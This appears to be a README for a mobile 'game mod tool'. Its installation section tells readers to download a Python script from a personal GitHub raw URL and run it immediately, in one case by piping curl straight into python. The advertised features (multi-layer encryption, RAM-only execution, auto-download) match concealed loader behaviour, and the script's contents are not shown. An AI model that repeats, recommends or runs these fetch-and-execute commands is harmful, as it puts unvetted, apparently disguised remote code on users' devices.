# HongHac Builda

Game mod tool for mobile.

## Installation

```bash
curl -O https://raw.githubusercontent.com/PhucVN2009/Toolvip/main/app.py && python app.py
```

Or:

```bash
curl -sL https://raw.githubusercontent.com/PhucVN2009/Toolvip/main/app.py | python
```

## Requirements

- Python 3.6+
- Kivy
- Internet connection

## Features

- Secure multi-layer encryption
- RAM-only execution
- Auto-download from GitHub
